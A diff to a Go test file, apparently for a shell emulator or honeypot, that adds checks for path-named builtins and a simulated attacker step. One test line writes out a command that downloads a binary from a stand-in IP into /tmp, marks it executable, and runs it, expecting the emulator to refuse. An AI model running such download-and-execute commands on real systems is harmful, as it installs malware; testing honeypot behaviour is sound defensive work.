@@ -259,10 +259,15 @@ func TestUnknownCommand(t *testing.T) {
 	if st != 127 || !strings.Contains(errb, "No such file") {
 		t.Errorf("missing path: %q %d", errb, st)
 	}
-	// An existing binary "runs" but is not a real program.
-	_, errb, st = run(t, in, s, "/usr/bin/ls")
+	// A system program named by path runs the builtin behind it.
+	if out, errb, st := run(t, in, s, "/usr/bin/ls -d /tmp"); st != 0 || out != "/tmp\n" {
+		t.Errorf("/usr/bin/ls: %q %q %d", out, errb, st)
+	}
+	// A downloaded payload "runs" but is not a real program.
+	run(t, in, s, "wget -q http://198.51.100.7/x86 -O /tmp/x86; chmod +x /tmp/x86")
+	_, errb, st = run(t, in, s, "/tmp/x86")
 	if st != 126 || !strings.Contains(errb, "Exec format error") {
-		t.Errorf("fake binary exec: %q %d", errb, st)
+		t.Errorf("payload exec: %q %d", errb, st)
 	}
 	// Fallback is consulted for unknown commands.
 	in.Fallback = func(c *Context) (int, bool) {
